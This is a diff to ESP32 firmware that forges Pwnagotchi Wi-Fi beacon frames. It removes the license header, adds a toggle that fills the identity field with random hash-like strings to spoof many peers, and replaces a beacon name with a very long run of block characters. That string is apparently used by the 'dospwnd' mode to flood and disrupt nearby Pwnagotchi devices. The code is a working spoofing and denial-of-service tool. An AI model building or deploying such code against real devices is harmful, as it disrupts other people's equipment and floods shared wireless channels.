@@ -1,31 +1,3 @@
-/*
-MIT License
-
-Copyright (c) 2024 7h30th3r0n3
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-In addition, all copies or substantial portions of the Software must give
-appropriate credit to the original author by linking to the original repository
-and mentioning the author's name.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-*/
-
 #include "ArduinoJson.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
@@ -39,6 +11,7 @@ SOFTWARE.
 
 volatile bool stop_beacon = false;
 volatile bool dos_pwnd = false;
+volatile bool change_identity = false;
 
 // Define the raw beacon frame
 const uint8_t beacon_frame_template[] = {
@@ -53,6 +26,16 @@ const uint8_t beacon_frame_template[] = {
   0x11, 0x04   // Capability info
 };
 
+// Function to generate a random string that resembles a SHA-256 hash
+String generate_random_identity() {
+  const char hex_chars[] = "0123456789abcdef";
+  String random_identity = "";
+  for (int i = 0; i < 64; ++i) {
+    random_identity += hex_chars[random(0, 16)];
+  }
+  return random_identity;
+}
+
 // Function to send the beacon frame
 void send_beacon(uint8_t channel, const char* face, const char* name) {
   DynamicJsonDocument json(2048);
@@ -61,7 +44,11 @@ void send_beacon(uint8_t channel, const char* face, const char* name) {
   json["face"] = face;
   json["epoch"] = 1;
   json["grid_version"] = "1.10.3";
-  json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
+  if (change_identity) {
+    json["identity"] = generate_random_identity();
+  } else {
+    json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
+  }
   json["pwnd_run"] = 0;
   json["pwnd_tot"] = 0;
   json["session_id"] = "a2:00:64:e6:0b:8b";
@@ -119,7 +106,7 @@ void beacon_task(void* pvParameters) {
   };
 
   const char* pwnd_names[] = {
-    "Am I blocking the view?"
+    "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
   };
 
   const uint8_t channels[] = {1, 6, 11}; // List of Wi-Fi channels to use
@@ -180,13 +167,25 @@ void serial_task(void* pvParameters) {
         dos_pwnd = false;
         stop_beacon = false;
         Serial.println("Regular Beacon transmission started.");
+      } else if (strcmp(command, "randomid") == 0) {
+        change_identity = !change_identity;
+        Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
+      } else if (strcmp(command, "help") == 0) {
+        Serial.println("Available commands:");
+        Serial.println("  stop - Stop beacon transmission");
+        Serial.println("  start - Start beacon transmission");
+        Serial.println("  dospwnd - Start PWND beacon transmission");
+        Serial.println("  stopdospwnd - Stop PWND beacon transmission");
+        Serial.println("  randomid - Toggle random identity generation");
+        Serial.println("  help - Show this help message");
       } else {
-        Serial.println("Unknown command.");
+        Serial.println("Unknown command. Type 'help' for a list of commands.");
       }
     }
     vTaskDelay(100 / portTICK_PERIOD_MS);  // Wait 100 ms
   }
 }
+
 
 void setup() {
   // Initialize NVS
